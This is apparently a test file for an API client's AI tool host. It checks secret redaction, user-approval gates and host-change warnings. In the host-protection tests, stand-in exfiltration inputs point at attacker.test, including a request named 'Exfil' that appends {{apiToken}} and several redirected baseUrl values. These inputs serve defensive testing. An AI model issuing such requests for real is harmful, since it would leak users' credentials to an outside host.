import { describe, expect, it, vi } from 'vitest';
import {
  createDefaultGraphQLRequest,
  createDefaultHttpRequest,
  createEmptyCollection,
  type AwjcCollection,
  type RequestItem,
} from '../../shared/collectionSchema';
import type { HttpResponseResult } from '../../shared/httpTypes';
import { executeAiTool, type AiToolHost, type AiToolTab } from './aiToolHost';
import type { AiGraphqlSchema } from './aiGraphqlSchema';
import { loadSchemaFromSdl } from '../../shared/graphqlSchemaLoader';

const SECRET = 'sup3r-s3cret-value';

function makeHost(
  overrides: {
    autoApplyEdits?: boolean;
    confirmBeforeRun?: boolean;
    approve?: boolean;
    shareEnvironmentValues?: boolean;
    /** Origin the active request resolves to; null when it cannot be resolved. */
    origin?: string | null;
  } = {},
) {
  const inCollection = createDefaultHttpRequest({
    id: 'req_in_col',
    name: 'In collection',
    url: '{{baseUrl}}/items?api_key=abcdef12345',
    headers: [{ key: 'Authorization', value: `Bearer ${SECRET}`, enabled: true }],
    auth: { type: 'bearer', bearer: { token: SECRET } },
  });
  const active = createDefaultHttpRequest({ id: 'req_active', name: 'Active', url: '{{baseUrl}}/users' });
  const gql = createDefaultGraphQLRequest({ id: 'req_gql', name: 'GQL' });
  let collection: AwjcCollection = createEmptyCollection('Payments', {
    items: [
      { kind: 'folder', id: 'fld_1', name: 'Folder', items: [inCollection] },
      active,
      gql,
    ],
  });
  collection = {
    ...collection,
    activeEnvironment: 'dev',
    environments: [
      {
        id: 'env_dev',
        name: 'dev',
        variables: [
          { key: 'baseUrl', value: 'http://localhost', enabled: true },
          { key: 'apiToken', value: SECRET, enabled: true, secret: true },
        ],
      },
    ],
    variables: [{ key: 'region', value: 'eu', enabled: true }],
  };
  const state = {
    collections: [{ filePath: '/c.awjc', collection }],
    tabs: [{ id: 'tab1', collectionPath: '/c.awjc', request: active, isDirty: false }] as AiToolTab[],
    activeTabId: 'tab1' as string | null,
    response: null as HttpResponseResult | null,
    schema: null as AiGraphqlSchema | null,
  };
  const calls = {
    updateRequest: vi.fn(),
    updateCollection: vi.fn(),
    addRequest: vi.fn(),
    openRequest: vi.fn().mockReturnValue(true),
    sendActiveRequest: vi.fn(),
    requestApproval: vi.fn().mockResolvedValue(overrides.approve ?? true),
  };
  const host: AiToolHost = {
    workspace: {
      getCollections: () => state.collections,
      getActiveCollectionPath: () => '/c.awjc',
      getTabs: () => state.tabs,
      getActiveTabId: () => state.activeTabId,
      getResponse: () => state.response,
      getGraphqlSchema: () => state.schema,
      getSecretValues: () => [SECRET],
      updateRequest: calls.updateRequest,
      updateCollection: calls.updateCollection,
      addRequest: calls.addRequest,
      openRequest: calls.openRequest,
      sendActiveRequest: calls.sendActiveRequest,
      resolveRequestOrigin: () => (overrides.origin === undefined ? 'http://localhost' : overrides.origin),
    },
    requestApproval: calls.requestApproval,
    approvedSendOrigins: new Set<string>(),
    getApprovalPolicy: async () => ({
      autoApplyEdits: overrides.autoApplyEdits ?? false,
      confirmBeforeRun: overrides.confirmBeforeRun ?? true,
      shareEnvironmentValues: overrides.shareEnvironmentValues ?? true,
    }),
  };
  return { host, state, calls, collectionId: collection.metadata.id };
}

const call = (name: string, args: Record<string, unknown> = {}) => ({ id: 'c', name, arguments: args });
const parse = (r: { content: string }) => JSON.parse(r.content);

function response(): HttpResponseResult {
  return {
    requestId: 'r',
    ok: true,
    finalUrl: 'http://x/users',
    method: 'GET',
    status: 200,
    statusText: 'OK',
    httpVersion: '1.1',
    headers: { 'content-type': 'application/json', authorization: `Bearer ${SECRET}` },
    rawHeaders: [],
    cookies: [],
    body: `{"ok":true,"echo":"${SECRET}"}`,
    isBinary: false,
    contentType: 'application/json',
    sizeBytes: 5,
    transferSizeBytes: 5,
    timings: { dnsMs: 0, tcpMs: 0, tlsMs: 0, ttfbMs: 0, downloadMs: 0, totalMs: 9 },
    tls: null,
    redirects: [],
    captures: [],
    assertions: [],
    sentHeaders: { Authorization: `Bearer ${SECRET}` },
  } as HttpResponseResult;
}

describe('read tools', () => {
  it('overview lists collections, environments and tabs without paths or secrets', async () => {
    const { host, collectionId } = makeHost();
    const r = await executeAiTool(call('get_workspace_overview'), host);
    expect(r.ok).toBe(true);
    const data = parse(r);
    expect(data.activeCollectionId).toBe(collectionId);
    expect(data.collections[0]).toMatchObject({ name: 'Payments', environments: ['dev'], activeEnvironment: 'dev' });
    expect(data.tabs[0]).toMatchObject({ requestId: 'req_active', active: true });
    expect(r.content).not.toContain('/c.awjc');
  });

  it('get_request reads the active tab or any request by id, hiding auth and credentials', async () => {
    const { host } = makeHost();
    expect(parse(await executeAiTool(call('get_request'), host))).toMatchObject({ id: 'req_active', authType: 'inherit' });
    const r = await executeAiTool(call('get_request', { requestId: 'req_in_col' }), host);
    expect(r.ok).toBe(true);
    expect(r.content).not.toContain(SECRET);
    expect(r.content).not.toContain('abcdef12345');
    expect(parse(r).authType).toBe('bearer');
    const missing = await executeAiTool(call('get_request', { requestId: 'nope' }), host);
    expect(missing).toMatchObject({ ok: false, content: expect.stringContaining('No request with id') });
  });

  it('prefers the open tab (with unsaved edits) over the saved tree item', async () => {
    const { host, state } = makeHost();
    state.tabs[0] = { ...state.tabs[0], request: { ...state.tabs[0].request, name: 'Edited' }, isDirty: true };
    const data = parse(await executeAiTool(call('get_request', { requestId: 'req_active' }), host));
    expect(data).toMatchObject({ name: 'Edited', unsavedChanges: true });
  });

  it('get_response sanitizes and handles the no-response case', async () => {
    const { host, state } = makeHost();
    expect(parse(await executeAiTool(call('get_response'), host)).message).toMatch(/no response yet/);
    state.response = response();
    const r = await executeAiTool(call('get_response', { maxChars: 5 }), host);
    expect(r.content).not.toContain(SECRET);
    expect(r.content).not.toContain('sentHeaders');
    expect(parse(r)).toMatchObject({ status: 200, nextOffset: 5 });
  });

  it('list_environments hides secret values; list_collection_items outlines the tree', async () => {
    const { host } = makeHost();
    const envs = await executeAiTool(call('list_environments'), host);
    expect(envs.content).not.toContain(SECRET);
    const data = parse(envs);
    expect(data.environments[0].variables.find((v: { key: string }) => v.key === 'baseUrl').value).toBe('http://localhost');
    expect(data.environments[0].variables.find((v: { key: string }) => v.key === 'apiToken')).toMatchObject({ secret: true });
    expect(data.collectionVariables[0].key).toBe('region');

    const tree = parse(await executeAiTool(call('list_collection_items'), host));
    expect(tree.nodes[0]).toMatchObject({ kind: 'folder', id: 'fld_1' });
    expect(JSON.stringify(tree)).not.toContain('abcdef12345');
    expect(await executeAiTool(call('list_collection_items', { collectionId: 'zzz' }), host)).toMatchObject({ ok: false });
  });

  it('withholds every environment value when sharing is turned off, keeping names', async () => {
    const { host } = makeHost({ shareEnvironmentValues: false });
    const r = await executeAiTool(call('list_environments'), host);
    const data = parse(r);
    expect(r.content).not.toContain('http://localhost');
    expect(r.content).not.toContain('"eu"');
    expect(data.valuesHidden).toMatch(/not to share/);
    expect(data.environments[0].variables.map((v: { key: string }) => v.key)).toEqual(['baseUrl', 'apiToken']);
    expect(data.collectionVariables[0].key).toBe('region');
  });

  it('open_request opens and reports failures', async () => {
    const { host, calls } = makeHost();
    expect(parse(await executeAiTool(call('open_request', { requestId: 'req_in_col' }), host)).opened).toBe(true);
    expect(calls.openRequest).toHaveBeenCalledWith('req_in_col');
    expect(await executeAiTool(call('open_request', {}), host)).toMatchObject({ ok: false });
    calls.openRequest.mockReturnValue(false);
    expect(await executeAiTool(call('open_request', { requestId: 'req_gql' }), host)).toMatchObject({ ok: false });
  });
});

describe('GraphQL tools', () => {
  const bundle = loadSchemaFromSdl('type User { id: ID!, name: String! } type Query { user(id: ID!): User }');

  it('explain how to load a schema when none is available', async () => {
    const { host } = makeHost();
    for (const c of [call('get_graphql_schema'), call('validate_graphql_query', { query: '{ user(id:1){id} }' })]) {
      expect(await executeAiTool(c, host)).toMatchObject({ ok: false, content: expect.stringContaining('No GraphQL schema is loaded') });
    }
  });

  it('load_graphql_schema needs an open GraphQL tab, asks first, and returns the overview', async () => {
    const { host, state, calls } = makeHost();
    expect(await executeAiTool(call('load_graphql_schema'), host)).toMatchObject({
      ok: false,
      content: expect.stringContaining('not a GraphQL request'),
    });
    const gql = state.collections[0].collection.items.find(i => i.id === 'req_gql') as RequestItem;
    state.tabs = [...state.tabs, { id: 'tab2', collectionPath: '/c.awjc', request: gql }];
    state.activeTabId = 'tab2';
    const loader = vi
      .fn()
      .mockResolvedValueOnce({ ok: false, error: `401 for token ${SECRET}` })
      .mockResolvedValueOnce({ ok: true, schema: { introspection: bundle.introspection, metadata: bundle.metadata } });
    host.workspace.loadGraphqlSchema = loader;

    const failed = await executeAiTool(call('load_graphql_schema'), host);
    expect(failed).toMatchObject({ ok: false, content: expect.stringContaining('Could not load the schema') });
    expect(failed.content).not.toContain(SECRET);
    expect(calls.requestApproval.mock.calls[0][0]).toMatchObject({ risk: 'run', title: expect.stringContaining('Load GraphQL schema') });

    const loaded = parse(await executeAiTool(call('load_graphql_schema'), host));
    expect(loaded.loaded).toBe(true);
    expect(loaded.schema.query.fields).toContain('user(id: ID!): User');
  });

  it('does not load the schema when the user declines', async () => {
    const { host, state } = makeHost({ approve: false });
    const gql = state.collections[0].collection.items.find(i => i.id === 'req_gql') as RequestItem;
    state.tabs = [{ id: 'tab2', collectionPath: '/c.awjc', request: gql }];
    state.activeTabId = 'tab2';
    const loader = vi.fn();
    host.workspace.loadGraphqlSchema = loader;
    expect(await executeAiTool(call('load_graphql_schema'), host)).toMatchObject({ ok: false, content: expect.stringContaining('declined') });
    expect(loader).not.toHaveBeenCalled();
  });

  it('describes the schema and validates queries with actionable errors', async () => {
    const { host, state } = makeHost();
    state.schema = { introspection: bundle.introspection, metadata: bundle.metadata };
    const overview = parse(await executeAiTool(call('get_graphql_schema'), host));
    expect(overview.query.fields).toContain('user(id: ID!): User');
    expect(parse(await executeAiTool(call('get_graphql_schema', { typeName: 'User' }), host)).fields).toEqual(['id: ID!', 'name: String!']);
    expect(await executeAiTool(call('get_graphql_schema', { typeName: 'Nope' }), host)).toMatchObject({ ok: false });

    const good = parse(await executeAiTool(call('validate_graphql_query', { query: '{ user(id: "1") { id name } }' }), host));
    expect(good.valid).toBe(true);
    const bad = parse(await executeAiTool(call('validate_graphql_query', { query: '{ user(id: "1") { email } }' }), host));
    expect(bad.valid).toBe(false);
    expect(bad.errors[0].message).toMatch(/email/);
    expect(await executeAiTool(call('validate_graphql_query', { query: ' ' }), host)).toMatchObject({ ok: false });
  });
});

describe('write tools', () => {
  it('update_request asks for approval, then applies only the validated changes', async () => {
    const { host, calls } = makeHost();
    const r = await executeAiTool(call('update_request', { changes: { url: '{{baseUrl}}/v2', method: 'post' } }), host);
    expect(calls.requestApproval).toHaveBeenCalledWith(
      expect.objectContaining({ tool: 'update_request', risk: 'write', lines: expect.arrayContaining(['Method → POST']) }),
    );
    expect(r.ok).toBe(true);
    const [id, next] = calls.updateRequest.mock.calls[0] as [string, RequestItem];
    expect(id).toBe('req_active');
    expect(next).toMatchObject({ url: '{{baseUrl}}/v2', method: 'POST' });
  });

  it('does not apply when the user declines, and tells the model not to retry', async () => {
    const { host, calls } = makeHost({ approve: false });
    const r = await executeAiTool(call('update_request', { changes: { name: 'X' } }), host);
    expect(r).toMatchObject({ ok: false, content: expect.stringContaining('declined') });
    expect(calls.updateRequest).not.toHaveBeenCalled();
  });

  it('skips approval only when autoApplyEdits is on', async () => {
    const { host, calls } = makeHost({ autoApplyEdits: true });
    await executeAiTool(call('update_request', { changes: { name: 'Auto' } }), host);
    expect(calls.requestApproval).not.toHaveBeenCalled();
    expect(calls.updateRequest).toHaveBeenCalled();
  });

  it('rejects auth edits and invalid changes before asking the user', async () => {
    const { host, calls } = makeHost();
    const auth = await executeAiTool(call('update_request', { changes: { auth: { type: 'none' } } }), host);
    expect(auth).toMatchObject({ ok: false, content: expect.stringContaining('Auth cannot be read or changed') });
    const secret = await executeAiTool(
      call('update_request', { changes: { headers: { set: [{ key: 'Authorization', value: 'Bearer literal123' }] } } }),
      host,
    );
    expect(secret.ok).toBe(false);
    expect(calls.requestApproval).not.toHaveBeenCalled();
    expect(calls.updateRequest).not.toHaveBeenCalled();
  });

  it('rejects no-op edits without asking, and reports which fields changed', async () => {
    const { host, calls } = makeHost();
    const noop = await executeAiTool(call('update_request', { changes: { name: 'Active' } }), host);
    expect(noop).toMatchObject({ ok: false, content: expect.stringContaining('No changes') });
    expect(calls.requestApproval).not.toHaveBeenCalled();

    const r = parse(await executeAiTool(call('update_request', { changes: { name: 'Active', url: '{{baseUrl}}/v2' } }), host));
    expect(r.changed).toEqual(['Url']);
  });

  it('update_graphql_operation edits the GraphQL fields through the same approval path', async () => {
    const { host, calls } = makeHost();
    const query = 'query GetPart($sku: ID!) {\n  part(sku: $sku) { name sku }\n}';
    const r = await executeAiTool(
      call('update_graphql_operation', { requestId: 'req_gql', query, variables: '{"sku": "SKU-1"}', operationName: 'GetPart' }),
      host,
    );
    expect(calls.requestApproval).toHaveBeenCalledWith(
      expect.objectContaining({ tool: 'update_graphql_operation', risk: 'write', title: 'Edit request "GQL"' }),
    );
    expect(parse(r).changed).toEqual(['GraphQL query', 'GraphQL variables', 'GraphQL operationName']);
    const [id, next] = calls.updateRequest.mock.calls[0] as [string, RequestItem];
    expect(id).toBe('req_gql');
    expect(next.graphql).toMatchObject({ query, variables: '{"sku": "SKU-1"}', operationName: 'GetPart' });
  });

  it('update_graphql_operation rejects empty, non-GraphQL and secret-bearing edits before asking', async () => {
    const { host, calls } = makeHost();
    expect(await executeAiTool(call('update_graphql_operation', { requestId: 'req_gql' }), host)).toMatchObject({ ok: false });
    expect(await executeAiTool(call('update_graphql_operation', { requestId: 'req_gql', query: '  ' }), host)).toMatchObject({ ok: false });
    expect(await executeAiTool(call('update_graphql_operation', { query: '{ a }' }), host)).toMatchObject({
      ok: false,
      content: expect.stringContaining('only apply to GraphQL requests'),
    });
    const placeholder = await executeAiTool(
      call('update_graphql_operation', { requestId: 'req_gql', variables: '{"token": "[REDACTED]"}' }),
      host,
    );
    expect(placeholder).toMatchObject({ ok: false, content: expect.stringContaining('[REDACTED]') });
    expect(calls.requestApproval).not.toHaveBeenCalled();
    expect(calls.updateRequest).not.toHaveBeenCalled();
  });

  it('update_graphql_operation results never echo workspace secrets', async () => {
    const { host } = makeHost();
    const r = await executeAiTool(
      call('update_graphql_operation', { requestId: 'req_gql', query: `{ me(note: "${SECRET}") { id } }` }),
      host,
    );
    expect(r.ok).toBe(true);
    expect(r.content).not.toContain(SECRET);
  });

  it('create_request validates the folder, asks approval, and adds the request', async () => {
    const { host, calls } = makeHost();
    const r = await executeAiTool(
      call('create_request', { folderId: 'fld_1', request: { name: 'New', method: 'GET', url: '{{baseUrl}}/new' } }),
      host,
    );
    expect(r.ok).toBe(true);
    expect(calls.addRequest).toHaveBeenCalledWith('/c.awjc', 'fld_1', expect.objectContaining({ name: 'New' }));
    expect(calls.requestApproval.mock.calls[0][0].title).toContain('Folder');

    expect(await executeAiTool(call('create_request', { folderId: 'req_gql', request: { name: 'x' } }), host)).toMatchObject({ ok: false });
    expect(await executeAiTool(call('create_request', { request: { auth: {} } }), host)).toMatchObject({ ok: false });
  });

  it('set_environment_variables updates a named environment and never writes secrets', async () => {
    const { host, calls } = makeHost();
    const r = await executeAiTool(
      call('set_environment_variables', { environment: 'dev', variables: [{ key: 'baseUrl', value: 'http://new' }] }),
      host,
    );
    expect(r.ok).toBe(true);
    const updater = calls.updateCollection.mock.calls[0][1] as (c: AwjcCollection) => AwjcCollection;
    const before = makeHost().state.collections[0].collection;
    const after = updater(before);
    expect(after.environments?.[0].variables.find(v => v.key === 'baseUrl')?.value).toBe('http://new');
    expect(after.environments?.[0].variables.find(v => v.key === 'apiToken')?.value).toBe(SECRET);

    const blocked = await executeAiTool(
      call('set_environment_variables', { variables: [{ key: 'apiToken', value: 'new-secret-value' }] }),
      host,
    );
    expect(blocked).toMatchObject({ ok: false, content: expect.stringContaining('cannot set its value') });
    expect(await executeAiTool(call('set_environment_variables', { environment: 'nope', variables: [{ key: 'a' }] }), host)).toMatchObject({ ok: false });
  });

  it('set_environment_variables can target collection variables', async () => {
    const { host, calls } = makeHost();
    await executeAiTool(call('set_environment_variables', { environment: 'collection', variables: [{ key: 'region', value: 'us' }] }), host);
    const updater = calls.updateCollection.mock.calls[0][1] as (c: AwjcCollection) => AwjcCollection;
    expect(updater(makeHost().state.collections[0].collection).variables?.[0].value).toBe('us');
  });
});

describe('change previews and undo', () => {
  it('shows before/after values and reports an undo that restores the previous request', async () => {
    const { host, calls } = makeHost();
    const onApplied = vi.fn();
    host.onApplied = onApplied;
    await executeAiTool(call('update_request', { changes: { url: '{{baseUrl}}/v2' } }), host);
    expect(calls.requestApproval.mock.calls[0][0].changes).toEqual([
      { field: 'Url', before: '{{baseUrl}}/users', after: '{{baseUrl}}/v2' },
    ]);
    expect(onApplied).toHaveBeenCalledWith(expect.objectContaining({ tool: 'update_request', title: 'Edit request "Active"' }));
    onApplied.mock.calls[0][0].undo();
    expect(calls.updateRequest).toHaveBeenLastCalledWith('req_active', expect.objectContaining({ url: '{{baseUrl}}/users' }));
  });

  it('undoes created requests and variable edits; nothing to undo when declined', async () => {
    const { host, calls } = makeHost();
    const onApplied = vi.fn();
    const removeRequest = vi.fn();
    host.onApplied = onApplied;
    host.workspace.removeRequest = removeRequest;

    await executeAiTool(call('create_request', { request: { name: 'New', url: '{{baseUrl}}/new' } }), host);
    const created = calls.addRequest.mock.calls[0][2] as RequestItem;
    onApplied.mock.calls[0][0].undo();
    expect(removeRequest).toHaveBeenCalledWith('/c.awjc', created.id);

    await executeAiTool(call('set_environment_variables', { variables: [{ key: 'region', value: 'us' }] }), host);
    expect(calls.requestApproval.mock.calls.at(-1)![0].changes).toEqual([{ field: 'Variable region', before: '', after: 'us' }]);
    onApplied.mock.calls[1][0].undo();
    const restore = calls.updateCollection.mock.calls.at(-1)![1] as (c: AwjcCollection) => AwjcCollection;
    const restored = restore(makeHost().state.collections[0].collection);
    expect(restored.environments?.[0].variables.map(v => v.key)).toEqual(['baseUrl', 'apiToken']);

    const declined = makeHost({ approve: false });
    declined.host.onApplied = vi.fn();
    await executeAiTool(call('update_request', { changes: { name: 'x' } }), declined.host);
    expect(declined.host.onApplied).not.toHaveBeenCalled();
  });
});

describe('redirect protection', () => {
  it('always asks before changing a request host, even with auto-apply on', async () => {
    const { host, calls } = makeHost({ autoApplyEdits: true });
    await executeAiTool(call('update_request', { changes: { url: '{{baseUrl}}/users?page=2' } }), host);
    expect(calls.requestApproval).not.toHaveBeenCalled();

    await executeAiTool(call('update_request', { changes: { url: 'https://attacker.test/collect' } }), host);
    expect(calls.requestApproval).toHaveBeenCalledTimes(1);
    expect(calls.requestApproval.mock.calls[0][0].warning).toContain('different host');
  });

  it('does not apply a host change the user declines', async () => {
    const { host, calls } = makeHost({ autoApplyEdits: true, approve: false });
    const r = await executeAiTool(call('update_request', { changes: { url: 'https://attacker.test/' } }), host);
    expect(r.ok).toBe(false);
    expect(calls.updateRequest).not.toHaveBeenCalled();
  });

  it('always asks before changing URL-valued variables, even with auto-apply on', async () => {
    const { host, calls } = makeHost({ autoApplyEdits: true });
    await executeAiTool(call('set_environment_variables', { variables: [{ key: 'region', value: 'us' }] }), host);
    expect(calls.requestApproval).not.toHaveBeenCalled();

    await executeAiTool(
      call('set_environment_variables', { variables: [{ key: 'baseUrl', value: 'https://attacker.test' }] }),
      host,
    );
    expect(calls.requestApproval).toHaveBeenCalledTimes(1);
    expect(calls.requestApproval.mock.calls[0][0].warning).toContain('baseUrl');
  });
});

describe('host protection (security review)', () => {
  it('create_request asks when the new request uses a host the collection does not', async () => {
    const { host, calls } = makeHost({ autoApplyEdits: true });
    await executeAiTool(call('create_request', { request: { name: 'Ok', url: '{{baseUrl}}/new' } }), host);
    expect(calls.requestApproval).not.toHaveBeenCalled();
    expect(calls.addRequest).toHaveBeenCalledTimes(1);

    const r = await executeAiTool(
      call('create_request', { request: { name: 'Exfil', url: 'https://attacker.test/c?k={{apiToken}}' } }),
      host,
    );
    expect(r.ok).toBe(true);
    expect(calls.requestApproval).toHaveBeenCalledTimes(1);
    expect(calls.requestApproval.mock.calls[0][0].warning).toContain('host no other request');
  });

  it('does not create a request to a new host when the user declines', async () => {
    const { host, calls } = makeHost({ autoApplyEdits: true, approve: false });
    await executeAiTool(call('create_request', { request: { url: 'https://attacker.test/' } }), host);
    expect(calls.addRequest).not.toHaveBeenCalled();
  });

  it('asks before adding a capture that writes into a host variable', async () => {
    const capture = { variable: 'baseUrl', scope: 'environment', source: 'jsonpath', expression: '$.website' };
    const { host, calls } = makeHost({ autoApplyEdits: true });
    await executeAiTool(
      call('update_request', { changes: { captures: [{ ...capture, variable: 'orderId' }] } }),
      host,
    );
    expect(calls.requestApproval).not.toHaveBeenCalled();

    await executeAiTool(call('update_request', { changes: { captures: [capture] } }), host);
    expect(calls.requestApproval).toHaveBeenCalledTimes(1);
    expect(calls.requestApproval.mock.calls[0][0].warning).toContain('baseUrl');

    await executeAiTool(
      call('create_request', { request: { url: '{{baseUrl}}/x', captures: [capture] } }),
      host,
    );
    expect(calls.requestApproval).toHaveBeenCalledTimes(2);
    expect(calls.requestApproval.mock.calls[1][0].warning).toContain('Captures response values into baseUrl');
  });

  it('asks before switching off or shadowing a URL variable', async () => {
    const { host, calls } = makeHost({ autoApplyEdits: true });
    await executeAiTool(call('set_environment_variables', { variables: [{ key: 'baseUrl', enabled: false }] }), host);
    expect(calls.requestApproval).toHaveBeenCalledTimes(1);

    await executeAiTool(
      call('set_environment_variables', {
        environment: 'collection',
        variables: [{ key: 'baseUrl', value: 'https:attacker.test' }],
      }),
      host,
    );
    expect(calls.requestApproval).toHaveBeenCalledTimes(2);
    expect(calls.requestApproval.mock.calls[1][0].warning).toContain('baseUrl');
  });

  it('asks before changing a bare host variable used in request URLs', async () => {
    const { host, state, calls } = makeHost({ autoApplyEdits: true });
    const { collection } = state.collections[0];
    state.collections[0] = {
      ...state.collections[0],
      collection: {
        ...collection,
        items: [...collection.items, createDefaultHttpRequest({ url: 'https://{{apiHost}}/v1' })],
        variables: [{ key: 'apiHost', value: 'api.good.test', enabled: true }],
      },
    };
    await executeAiTool(
      call('set_environment_variables', { environment: 'collection', variables: [{ key: 'apiHost', value: 'attacker.test' }] }),
      host,
    );
    expect(calls.requestApproval).toHaveBeenCalledTimes(1);
    expect(calls.requestApproval.mock.calls[0][0].warning).toContain('apiHost');
  });

  it('send_request shows the resolved host and asks the first time per host, even without send confirmation', async () => {
    const { host, calls } = makeHost({ confirmBeforeRun: false, origin: 'https://api.good.test' });
    calls.sendActiveRequest.mockResolvedValue(response());
    await executeAiTool(call('send_request'), host);
    expect(calls.requestApproval).toHaveBeenCalledTimes(1);
    const first = calls.requestApproval.mock.calls[0][0];
    expect(first.title).toBe('Send GET {{baseUrl}}/users → https://api.good.test');
    expect(first.warning).toContain('First request from the assistant to https://api.good.test');

    await executeAiTool(call('send_request'), host);
    expect(calls.requestApproval).toHaveBeenCalledTimes(1);
    expect(calls.sendActiveRequest).toHaveBeenCalledTimes(2);

    host.workspace.resolveRequestOrigin = () => 'https://attacker.test';
    await executeAiTool(call('send_request'), host);
    expect(calls.requestApproval).toHaveBeenCalledTimes(2);
    expect(calls.requestApproval.mock.calls[1][0].warning).toContain('https://attacker.test');
  });

  it('send_request does not remember a declined host and always asks for unresolvable hosts', async () => {
    const declined = makeHost({ confirmBeforeRun: false, approve: false, origin: 'https://attacker.test' });
    await executeAiTool(call('send_request'), declined.host);
    expect(declined.host.approvedSendOrigins!.size).toBe(0);
    expect(declined.calls.sendActiveRequest).not.toHaveBeenCalled();

    const unknown = makeHost({ confirmBeforeRun: false, origin: null });
    unknown.calls.sendActiveRequest.mockResolvedValue(response());
    await executeAiTool(call('send_request'), unknown.host);
    await executeAiTool(call('send_request'), unknown.host);
    expect(unknown.calls.requestApproval).toHaveBeenCalledTimes(2);
    expect(unknown.calls.requestApproval.mock.calls[0][0].warning).toContain('could not be worked out');

    const noMemory = makeHost({ confirmBeforeRun: false });
    delete noMemory.host.approvedSendOrigins;
    noMemory.calls.sendActiveRequest.mockResolvedValue(response());
    await executeAiTool(call('send_request'), noMemory.host);
    await executeAiTool(call('send_request'), noMemory.host);
    expect(noMemory.calls.requestApproval).toHaveBeenCalledTimes(2);
  });
});

describe('send_request', () => {
  it('requires approval by default and returns a sanitized response', async () => {
    const { host, calls } = makeHost();
    calls.sendActiveRequest.mockResolvedValue(response());
    const r = await executeAiTool(call('send_request'), host);
    expect(calls.requestApproval).toHaveBeenCalledWith(expect.objectContaining({ risk: 'run' }));
    expect(r.ok).toBe(true);
    expect(r.content).not.toContain(SECRET);
    expect(parse(r).status).toBe(200);
  });

  it('is blocked on decline, and runs without asking when confirmBeforeRun is off', async () => {
    const declined = makeHost({ approve: false });
    expect(await executeAiTool(call('send_request'), declined.host)).toMatchObject({ ok: false });
    expect(declined.calls.sendActiveRequest).not.toHaveBeenCalled();

    const auto = makeHost({ confirmBeforeRun: false });
    auto.host.approvedSendOrigins!.add('http://localhost');
    auto.calls.sendActiveRequest.mockResolvedValue(response());
    await executeAiTool(call('send_request'), auto.host);
    expect(auto.calls.requestApproval).not.toHaveBeenCalled();
    expect(auto.calls.sendActiveRequest).toHaveBeenCalled();
  });

  it('edit auto-apply does not bypass run confirmation', async () => {
    const { host, calls } = makeHost({ autoApplyEdits: true });
    calls.sendActiveRequest.mockResolvedValue(response());
    await executeAiTool(call('send_request'), host);
    expect(calls.requestApproval).toHaveBeenCalled();
  });

  it('fails cleanly with no active tab or no response', async () => {
    const { host, state, calls } = makeHost({ confirmBeforeRun: false });
    host.approvedSendOrigins!.add('http://localhost');
    calls.sendActiveRequest.mockResolvedValue(null);
    expect(await executeAiTool(call('send_request'), host)).toMatchObject({ ok: false });
    state.activeTabId = null;
    expect(await executeAiTool(call('send_request'), host)).toMatchObject({ ok: false, content: expect.stringContaining('open_request') });
  });
});

describe('executeAiTool safety', () => {
  it('rejects unknown tools and converts thrown errors into failures', async () => {
    const { host, calls } = makeHost({ autoApplyEdits: true });
    expect(await executeAiTool(call('read_secrets'), host)).toMatchObject({ ok: false });
    calls.updateRequest.mockImplementation(() => {
      throw new Error('boom');
    });
    expect(await executeAiTool(call('update_request', { changes: { name: 'x' } }), host)).toMatchObject({
      ok: false,
      content: 'Tool failed: boom',
    });
  });
});
